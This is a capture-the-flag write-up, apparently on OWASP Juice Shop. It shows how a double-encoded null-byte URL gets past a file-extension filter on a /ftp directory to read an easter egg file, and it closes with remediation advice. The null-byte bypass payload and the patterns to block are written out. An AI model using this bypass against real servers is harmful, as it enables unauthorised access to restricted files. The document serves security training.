## [Broken Access Control] - [Easter Egg]

## General Information

* **Difficulty Level :** ⭐⭐⭐⭐ / 6

* **Date of Resolution :** 26/03/2026

---

## Vulnerability Analysis

* **Vulnerability Name :** Backup File Disclosure

* **Affected Components :** Public FTP Directory (`/ftp`)

* **Severity :** <span style="color:orange"> Medium </span>

---

## Proof of Concept (PoC)

#### 1. Enumeration & Techniques

* **Techniques used :** Directory Enumeration, File Discovery, Null Byte Injection
* **Tools used :** Web Browser

#### 2. Reproduction Steps

**Step 1 : Directory Discovery**

In the application, when `f12` is pressed, you can access the main.js file in the Sources. You can find the information that there is a path to a directory named ftp. In this directory, you can find multiples files not accessible because of their type. The server enforces a restriction on file extensions (.png,  .jpg, ...) to ensure only images are accessed.

![[ftp_folder.png]]

![[ftp_error.png]]

**Step 2 : Access Restriction Bypass**

To bypass this restriction, we will use the Null Byte Injection method. For this, we only have to add a null byte when trying to open the file.

```
https://ctf.juice.cyber.epitest.eu/ftp/eastere.gg%2500.md
```

**Step 3 : Sensitive Data Exposure**

The server return the content of the easter egg file:

``` 
"Congratulations, you found the easter egg!"
- The incredibly funny developers

...

...

...

Oh' wait, this isn't an easter egg at all! It's just a boring text file! The real easter egg can be found here:

L2d1ci9xcmlmL25lci9mYi9zaGFhbC9ndXJsL3V2cS9uYS9ybmZncmUvcnR0L2p2Z3V2YS9ndXIvcm5mZ3JlL3J0dA==

Good luck, egg hunter!
```

---
## Risk Assessment

* **Business Impact :** Not really any business impact, it's just a fun easter egg.

* **Technical Description of the Impact :** Not really any impact, it's just a fun easter egg.

---

## Actions & Remediation

#### Mitigation Strategies

   - Restrict access to sensitive directories like `/ftp`
   - Block null byte injection patterns (`%00`, `%2500`)

#### Recommended Fixes

   - Implement proper access control on all directories
   - Validate and sanitize user input after full decoding
   - Disable directory listing on sensitive paths

#### Security Best Practices

- A05:2021-Security Misconfiguration -> Disable directory listing and protect sensitive paths
- A03:2021-Injection -> Sanitize all inputs